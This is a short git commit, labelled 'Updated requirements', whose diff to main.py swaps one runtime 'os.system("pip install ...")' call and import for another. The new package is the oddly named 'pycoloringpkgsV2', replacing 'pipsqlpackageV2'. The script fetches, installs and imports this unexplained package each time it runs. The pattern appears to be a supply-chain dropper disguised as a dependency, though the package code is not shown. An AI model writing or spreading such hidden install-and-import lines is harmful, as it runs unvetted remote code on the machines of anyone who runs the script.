c29564cf4af9fa725d4eab565f3a029e4e9e6024
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-02 00:49:51 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlpackageV2")
-import pipsqlpackageV2
+os.system("pip install pycoloringpkgsV2")
+import pycoloringpkgsV2
 import json
 import httpx
 import time
